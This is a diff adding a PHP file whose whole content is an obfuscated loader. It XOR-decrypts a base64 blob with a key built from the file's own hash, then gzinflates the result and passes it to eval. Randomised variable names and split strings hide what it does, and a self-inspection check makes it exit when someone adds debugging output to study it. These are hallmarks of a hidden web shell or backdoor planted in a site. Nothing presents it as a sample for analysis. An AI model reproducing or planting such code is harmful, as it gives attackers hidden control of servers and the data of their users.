@@ -1,0 +1,24 @@
+<?php
+$opghrseumfe="3fb110ec35e3e20e83d13672ab21459f";
+$bivkqchf="0150045509060652505152525753015459025c57500e0151560357550c050d04";
+$tghfmogoxpi="r2I/KyMHc89IN4MDj0kVwWsTsLQzEkc3K4REJRPTqXKZuBEPA7LLwbxfgRZBQ2QzZPgDoVT/AVCt7rQyZBCoNufW0rD2oimQ0udsACLUDLXovPKt0XhTZBArqErco9UEhJfdEeR/iJXTJYeImRQI4GP2kDsAGiLUIX817Uq8BUrSnSU5YM6pXECePLTWKHgwIjNI1LdY/mc6qi0ByP9weP59pOJ6LC5k0q7XElzRY2V8egNlteZ/WV5qN573w4d9JYtaqwpeIOsK08qOLjR0pBZPcfq110BWnbMmLDLeDH5z1CC21kD84B5HNqo8SIOqeewQBCnmqcYBl8pXtaVlsrJ0WIsjk68wynIOZcQka7rvFMGRvWUJ1uUAn/z56y/SPSO9v/kTtKJSfh635pV2gejOmnSVRUqBNfYBKFKn9eilgSyU/cX3YkCWvV41jozyJ31nG1FzHgvnu2166vdFh1SaCG71toqW/6KRr8diCEUAHlyvgEwn9fFISalis2Je/82ZIOtHhqit1tLNKO3s33GsIIMy+XTSmuzHPieVdxrx5EZzG1ZuAdTUKr4TsMHbxlUOgK1Zp1h+RVo2RFKthN/KJnpgFF7F1dW5V1NlI2Zbn8ojtbPEIe1t0wpDJ4mxCQ7b2oeMAAr6q3exyFkJitiPPPkK28gT6dqMYTERKQ2HlpklabnznLJBZ0v0NwPYxhA8cxFE2kreDVFIXv+BbMntdtGJ7k81oA1TxYRv5WwxTpQFmEPooeWk1a9wWxOGTYJdVzO1X7a6iT0e8uWKlrMmWM2gEL35MqD4g0DgT3dqszMo6OXo9/dCYIQBugvSM1A5yOci7nwCYkTGpyKcdS5KFWpYvW174UXuKob3VRAuW6F+EttEHDQJ4KfCcG73BihQ4ZvYCTyHmWSQK/ti3tWoRA2NoueQckuATcUk+r7rFX/KR0lpFFses+ikVR00b6BQSF29g2Umkyc/drx0Ka6i+aHlNqrREhr26L6YW3WVyB/fpSW+kc9HBNysAaUSaGR5STIgsiZ+OuG1EDPLJMjS6e1nk1VxYgrGd5bDz10=";
+$iqmspzbkyyn=file_get_contents(__FILE__);
+$oqctdig=str_replace($tghfmogoxpi,"",$iqmspzbkyyn);
+if(strpos($oqctdig,"ec"."ho")!==false||strpos($oqctdig,"pr"."int")!==false||strpos($oqctdig,"var_"."dump")!==false||strpos($oqctdig,"file_put_"."contents")!==false||strpos($oqctdig,"fw"."rite")!==false){die();}
+$aphbvkquc=str_replace(array($opghrseumfe,$bivkqchf),array("SP_b7a7f067","KP_a995cba0"),$iqmspzbkyyn);
+$trurmyssih=md5($aphbvkquc);
+$ampqrdsjjyrq=hex2bin($bivkqchf);
+$areebmxosocx="";
+$xqgolqouxk=strlen($trurmyssih);
+for($jcejehstcfbk=0;$jcejehstcfbk<$xqgolqouxk;$jcejehstcfbk++){
+    $areebmxosocx.=chr(ord($ampqrdsjjyrq[$jcejehstcfbk])^ord($trurmyssih[$jcejehstcfbk]));
+}
+$oarogafx=base64_decode($tghfmogoxpi);
+$bywifffll=strlen($oarogafx);
+$xxnupxe="";
+$zkjkbx=strlen($areebmxosocx);
+for($jcejehstcfbk=0;$jcejehstcfbk<$bywifffll;$jcejehstcfbk++){
+    $xxnupxe.=$oarogafx[$jcejehstcfbk]^$areebmxosocx[$jcejehstcfbk%$zkjkbx];
+}
+$rocwfxmdrxrt="gz"."in"."fl"."ate";
+eval($rocwfxmdrxrt($xxnupxe));
